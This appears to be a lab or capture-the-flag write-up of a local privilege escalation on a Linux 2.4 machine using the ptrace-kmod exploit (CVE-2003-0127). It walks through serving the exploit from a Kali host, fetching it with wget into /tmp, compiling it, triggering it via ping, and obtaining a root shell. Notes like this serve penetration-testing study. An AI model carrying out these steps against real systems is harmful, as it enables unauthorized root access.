# Ptrace-Kmod Local Privilege Escalation Notes (CVE-2003-0127)

## 📍 Local Kali Linux Location
The exploit source code is packaged natively within Kali Linux's Exploit-DB repository:
* **Exploit-DB Path:** `/usr/share/exploitdb/exploits/linux/local/3.c`

## ⚙️ Exploit Mechanism
This exploit targets a race condition vulnerability in the Linux Kernel 2.4 ptrace code. It allows a local low-privilege user (such as `apache`) to attach to a privileged process and execute arbitrary code with root authority.

## 🛠️ Compilation & Execution Steps

### 1. Local Network Transfer
Because the target machine lacks modern SSL libraries to pull files directly from modern web sources (like GitHub or Pastebin), a local Python web server was used on the Kali host machine to deliver the payload:

```bash
# On Kali Host (Inside the directory containing 3.c renamed to ptrace.c)
python3 -m http.server 80
```

### 2. Compilation on Target
The file was downloaded into a writable folder (`/tmp`) and compiled using the target's native legacy `gcc` compiler:

```bash
cd /tmp
wget http://192.168.0.21>/ptrace.c
gcc -o ptrace ptrace.c
```
*Note: A minor syntax compilation warning `warning: no newline at end of file` may appear, but it does not prevent successful binary creation.*

### ⚡ The SUID Trigger
Once executed with `./ptrace`, the binary enters a waiting state (`[+] Now wait for suid shell...`). 

To force the kernel to trigger the privilege hook, a command that uses a **SetUID (SUID)** binary must be run by the user. Running `ping` forces the execution context change:

```bash
ping localhost -c 2
```

Upon executing the trigger, the background hook successfully intercepts the thread and spawns an interactive root shell.

```bash
whoami
# Output: root
```
